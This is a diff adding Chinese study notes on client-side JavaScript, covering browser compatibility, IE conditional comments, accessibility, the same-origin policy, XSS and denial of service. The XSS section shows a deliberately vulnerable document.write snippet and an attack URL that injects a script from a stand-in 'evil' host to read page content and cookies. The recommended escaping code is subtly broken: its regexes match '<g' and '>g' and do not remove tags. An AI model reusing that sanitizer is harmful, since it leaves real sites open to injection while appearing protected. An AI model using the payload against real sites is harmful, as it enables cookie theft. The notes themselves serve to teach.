@@ -152,3 +152,100 @@
 8. 调用异步事件，以异步响应用户的交互事件
 
 上面的时间线并不是所有的浏览器都支持，但是所有的浏览器普遍都支持`load`事件，都会触发它，它是决定文档完全载入并可以操作的最通用的技术
+
+## 兼容性和互用性
+由于不同的浏览器厂商对浏览器中的支持不同，所有就需要进行兼容
+
+### 处理兼容性问题的类库
+处理不兼容问题其中一个最简单的方式就是使用类库，比如`excanvas.js`、`jQuery`等等
+
+### 分级浏览器支持
+从某种维度对浏览器厂商/版本/操作系统变体进行分级，不同的等级满足不同的功能即可
+
+### 功能测试
+功能测试是解决不兼容问题的一种强大的技术。如果你想使用某个功能，但是又不清楚这个功能是否在所有的浏览器中都有比较好的兼容性，则需要在脚本添加相应的代码来检测是否在浏览器中支持该功能。比如检测是否支持`addEventListener`
+```javascript
+if (element.addEventListener) {
+    element.addEventListener('keydown', handler, false)
+} else if (element.attachEvent) {
+    element.attachEvent('onkeydown', handler)
+} else {
+    element.onkeydown = handler
+}
+```
+
+### 怪异模式和标准模式
+微软在发布`IE6`的时候，增加了`IE5`里很多没有的`CSS`标准特性，但是为了确保与已有的`Web`内容向后兼容，它定义了两种不同的渲染模式，在“标准模式”或“`css`兼容模式”中，浏览器要遵守`css`标准，在“怪异模式”中，浏览器表现的和`IE4/5`中的怪异非标准模式一样。
+
+渲染模式的选择依赖于`HTML`文件顶部的`DOCTYPE`声明，在`IE6`中打开了没有`DOCTYPE`的页面和声明了某些权限`DOCTYPE`的页面都会按照怪异模式进行渲染，定义了严格的`DOCTYPE`页面会按照标准模式进行渲染，定义了`HTML 5 Doctype`(`<!DOCTYPE html>`)的页面在所有现代浏览器中都会按照标准模式进行渲染
+
+现在浏览器都支持标准模式，如果需要进行渲染模式的特性检测，通常检查`document.compatMode`属性，其值为`CSS1Compat`时，则说明浏览器工作在标准模式，如果值为`BackCompat`或者为`undefined`，则说明浏览器工作在怪异模式
+
+### 浏览器测试
+有时候需要对浏览器进行检测，来解决特定浏览器下的问题，这个时候就需要进行浏览器检测。在客户端`javascript`中检测浏览器类型和版本的方法就是使用`Navigator`对象。需要注意的是，浏览器检测也可以在服务端完成，`web`服务器可以根据`User-Agent`头部来选择地返回特定的`javascript`代码给客户端
+
+### `Internet Explorer`里的条件注释
+客户端中的需要兼容性代码都是针对`IE`浏览器的，也就是说，必须按照某一种方式为`IE`编码，而按照另一种格式来为其他的浏览器编写代码
+
+下面是在`HTML`中的条件注释
+```html
+<!--[if IE 6]>
+this conten can be displayed in IE6
+<![endif]-->
+<!--[if lte IE 7]>
+this conten can be displayed in IE7
+<![endif]-->
+<!--[if !IE]><-->
+this conten can be displayed in IE7
+<!--><![endif]-->
+<!-- 在IE 浏览器中加载特定包 -->
+<!--[if IE]>
+<script src="excanvas.js"></script>
+<![endif]-->
+```
+下面是在`javascript`中的条件注释
+```javascript
+/*@cc_on
+  @if (@_jscript)
+    // 改代码位于一条js注释内，会在IE中执行
+    alert('in IE')
+  @end
+  @*/
+```
+
+## 可访问性
+需要确保那些有视觉障碍或者肢体困难的用户正确地获取信息。为了确保不同的用户能够正确获取并且使用网页应该尽量：
+1. 设计的代码即使在禁用`javascript`解释器的浏览器中也能正常使用
+
+2. 浏览器允许使用键盘来遍历和激活一个页面中的所有`UI`元素，应该多使用独立于设备的事件如`onfocus`、`onchange`等
+
+## 安全性
+
+### `javascript`不能做什么
+`web`浏览器针对恶意代码的第一个防线就是不支持某些功能，具体的功能见《`javascript`权威指南》`page 335`
+
+### 同源策略
+同源策略是对`javascript`代码能够操作哪些`web`内容的一条完整的完全限制，脚本只能读取和所属文档来源相同的窗口和文档的属性。文档的来源包含协议，主机以及端口号，其中的一个不同，都为不同的来源。
+
+***不严格的同源策略***
+在某些情况下，同源策略显得就过于严格，下面是几种不严格的同源策略
+1. 将两个窗口（或窗体）包含的脚本的`domain`属性设置为相同的值，这两个窗口就不受同源策略限制。例如，从`order.example.com`和`catalog.example.com`载入的文档中的脚本可以将它们的`document.domain`设置为`example.com`，这样就可以互相访问
+
+2. 跨域资源共享([`Cross-Origin Resource Sharing`](https://www.w3.org/TR/cors/))，这样就可以使用新的`origin`请求头和`Access-Control-Allow-Origin`响应头来扩展`HTTP`,它允许服务器用头信息显式地列出源或者使用通配符来匹配所有的源并允许由任何地址请求文件
+
+3. 跨文档消息，允许来自一个文档的脚本可以传递文本信息到另一个脚本，而不管脚本的来源是否不同。调用`window`对象上的`postMessage()`方法，可以异步传递消息事件（可以使用`onmessage`来处理）到窗口的文档里。一个文档里的脚本还是不能调用其他文档里的方法和读取里面的属性，但是可以使用这种消息传递技术来实现安全通信
+
+### 跨站脚本
+由于`script`标签可以引入其他服务器的脚本并运行，所以就会产生跨站脚本(`Cross-site Script`)，也就是`XSS`攻击，`XSS`攻击表示一类安全问题，也就是攻击者向目标`Web`站点注入`HTML`标签或者脚本
+
+如果一个页面地址为`http://www.example.com/greet.html?David`，然后在脚本中可以通过地址获取信息并动态生成脚本，如下代码:
+```javascript
+var name = decodeURIComponent(window.location.search.substring(1) || '')
+document.write("hello" +　name)
+```
+执行后会页面会显示`hello David`，但是如果使用`http://www.example.com/greet.html?name=%3Cscript src=http://siteB.evil.js%3E%3C/script%3E`, 就会注入一个来自站点`B`的脚本，这个脚本可以对站点中的内容进行任何想要的操作，还可能可以读取站点中的所有存储的`cookie`等
+
+一般情况下，防止`XSS`攻击的方式就是在任何不可信的数据来动态的创建文档内容之前，从中移除`HTML`标签，比如`name = name.replace(/<g/, "&lt;").replace(/>g/, "&gt;")`
+
+### 拒绝服务攻击
+访问启用`javascript`功能的一个恶意`web`站点，这个站点可以使用一个`alert()`对话框来无限循环占用浏览器，或者使用一个无限循环或没有意义的计算来占用`CPU`，这种对服务的攻击非常的暴力，但是实际上，由于没有人会返回一个滥用这种脚本的网站，因此这个在`web`上不是一个常见的问题
